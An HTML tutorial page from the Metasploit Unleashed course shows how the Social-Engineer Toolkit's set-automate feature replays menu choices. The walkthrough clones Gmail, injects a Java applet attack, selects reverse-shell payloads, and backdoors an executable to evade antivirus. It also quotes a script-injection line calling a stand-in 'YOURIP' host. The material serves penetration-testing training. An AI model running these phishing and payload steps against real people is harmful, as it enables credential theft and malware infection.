<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <meta content="text/html; charset=ISO-8859-1"
 http-equiv="Content-Type">
  <title>SET Automation</title>
<link rel="stylesheet" type="text/css" href="/home/steve/metasploit_unleashed/css.css" /></head>
<body>
<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">SET
Automation</h1>
<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
- Mastering The Framework</h3>
<p style="color: rgb(0, 0, 0);">SET has a feature called &#8220;set-automate&#8221;
which will take an answer
file (explained in a second) and enter the commands in the menu mode
for you. For example in prior walkthroughs you have to enter each menu
each time you prep the attack. So for example if I wanted to do the
Java Applet I would do this:
<br>
<br>
</p>
<pre id="code">1.  Spear-Phishing Attack Vectors<br>2.  Website Attack Vectors<br>3.  Infectious Media Generator<br>4.  Create a Payload and Listener<br>5.  Mass Mailer Attack<br>6.  Teensy USB HID Attack Vector<br>7.  SMS Spoofing Attack Vector<br>8   Update the Metasploit Framework<br>9.  Update the Social-Engineer Toolkit<br>10. Help, Credits, and About<br>11. Exit the Social-Engineer Toolkit<br><br>Enter your choice: 2<br><br>The Social-Engineer Toolkit "Web Attack" vector is a unique way of<br>utilizing multiple web-based attacks in order to compromise the<br>intended victim.<br><br>Enter what type of attack you would like to utilize.<br><br>The Java Applet attack will spoof a Java Certificate and<br>deliver a metasploit based payload. Uses a customized<br>java applet created by Thomas Werth to deliver<br>the payload.<br><br>The Metasploit browser exploit method will utilize select<br>Metasploit browser exploits through an iframe and deliver<br>a Metasploit payload.<br><br>The Credential Harvester Method will utilize web cloning<br>of a website that has a username and password field and<br>harvest all the information posted to the website.<br><br>The TabNabbing Method will wait for a user to move to a<br>different tab, then refresh the page to something different.<br><br>The Man Left in the Middle Attack Method was introduced by<br>Kos and utilizes HTTP REFERER's in order to intercept fields<br>and harvest data from them. You need to have an already vulnerable<br>site and incorporate &lt;script src="http://YOURIP/"&gt;. This could either<br>be from a compromised site or through XSS.<br><br>The web jacking attack method was introduced by white_sheep, Emgent<br>and the Back|Track team. This method utilizes iframe replacements to<br>make the highlighted URL link to appear legitimate however when clicked<br>a window pops up then is replaced with the malicious link. You can edit<br>the link replacement settings in the set_config if its too slow/fast.<br><br>The multi-attack will add a combination of attacks through the web attack<br>menu. For example you can utilize the Java Applet, Metasploit Browser,<br>Credential Harvester/Tabnabbing, and the Man Left in the Middle attack<br>all at once to see which is successful.<br><br>1. The Java Applet Attack Method<br>2. The Metasploit Browser Exploit Method<br>3. Credential Harvester Attack Method<br>4. Tabnabbing Attack Method<br>5. Man Left in the Middle Attack Method<br>6. Web Jacking Attack Method<br>7. Multi-Attack Web Method<br>8. Return to the previous menu<br><br>Enter your choice (press enter for default): 1<br><br><br>The first method will allow SET to import a list of pre-defined<br>web applications that it can utilize within the attack.<br><br>The second method will completely clone a website of your choosing<br>and allow you to utilize the attack vectors within the completely<br>same web application you were attempting to clone.<br><br>The third method allows you to import your own website, note that you<br>should only have an index.html when using the import website<br>functionality.<br><br>[!] Website Attack Vectors [!]<br><br>1. Web Templates<br>2. Site Cloner<br>3. Custom Import<br>4. Return to main menu<br><br>Enter number (1-4): 2<br><br>SET supports both HTTP and HTTPS<br>Example: http://www.thisisafakesite.com<br>Enter the url to clone: https://gmail.com<br><br>[*] Cloning the website: https://gmail.com<br>[*] This could take a little bit...<br>[*] Injecting Java Applet attack into the newly cloned website.<br>[*] Filename obfuscation complete. Payload name is: 8J5ovr0lC9tW<br>[*] Malicious java applet website prepped for deployment<br><br>What payload do you want to generate:<br><br>Name:                                      Description:<br><br>1. Windows Shell Reverse_TCP               Spawn a command shell on victim and send back to attacker.<br>2. Windows Reverse_TCP Meterpreter         Spawn a meterpreter shell on victim and send back to attacker.<br>3. Windows Reverse_TCP VNC DLL             Spawn a VNC server on victim and send back to attacker.<br>4. Windows Bind Shell                      Execute payload and create an accepting port on remote system.<br>5. Windows Bind Shell X64                  Windows x64 Command Shell, Bind TCP Inline<br>6. Windows Shell Reverse_TCP X64           Windows X64 Command Shell, Reverse TCP Inline<br>7. Windows Meterpreter Reverse_TCP X64     Connect back to the attacker (Windows x64), Meterpreter<br>8. Windows Meterpreter Egress Buster       Spawn a meterpreter shell and find a port home via multiple ports<br>9. Windows Meterpreter Reverse HTTPS       Tunnel communication over HTTP using SSL and use Meterpreter<br>10. Windows Meterpreter Reverse DNS        Tunnel communications over DNS and spawn a Meterpreter console<br>11. Import your own executable             Specify a path for your own executable<br><br>Enter choice (hit enter for default):<br><br>Below is a list of encodings to try and bypass AV.<br><br>Select one of the below, 'backdoored executable' is typically the best.<br><br>1. avoid_utf8_tolower (Normal)<br>2. shikata_ga_nai (Very Good)<br>3. alpha_mixed (Normal)<br>4. alpha_upper (Normal)<br>5. call4_dword_xor (Normal)<br>6. countdown (Normal)<br>7. fnstenv_mov (Normal)<br>8. jmp_call_additive (Normal)<br>9. nonalpha (Normal)<br>10. nonupper (Normal)<br>11. unicode_mixed (Normal)<br>12. unicode_upper (Normal)<br>13. alpha2 (Normal)<br>14. No Encoding (None)<br>15. Multi-Encoder (Excellent)<br>16. Backdoored Executable (BEST)<br><br>Enter your choice (enter for default):<br>[-] Enter the PORT of the listener (enter for default):<br><br>[-] Backdooring a legit executable to bypass Anti-Virus. Wait a few seconds...<br>[-] Backdoor completed successfully. Payload is now hidden within a legit executable.<br><br>********************************************************<br>Do you want to create a Linux/OSX reverse_tcp payload<br>in the Java Applet attack as well?<br>********************************************************<br><br>Enter choice yes or no: no</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Looking through the options, we
selected:
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">1<br>2<br>1<br>https://gmail.com<br><br><br><br>no</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">If you create a text file called
moo.txt or whatever you want and
input that into it you can call set-automate and it will enter it for
you each time.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">
root@bt:/pentest/exploits/set# ./set-automate moo.txt<br>[*] Spawning SET in a threaded process...<br>[*] Sending command 1 to the interface...<br>[*] Sending command 2 to the interface...<br>[*] Sending command 1 to the interface...<br>[*] Sending command https://gmail.com to the interface...<br>[*] Sending command default to the interface...<br>[*] Sending command default to the interface...<br>[*] Sending command default to the interface...<br>[*] Sending command no to the interface...<br>[*] Sending command default to the interface...<br>[*] Finished sending commands, interacting with the interface..</pre>
<br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="text-align: center; color: rgb(0, 0, 0);"><a
 href="http://www.offensive-security.com/metasploit-unleashed/SET"
 title="SET">SET</a></div>
</body>
</html>
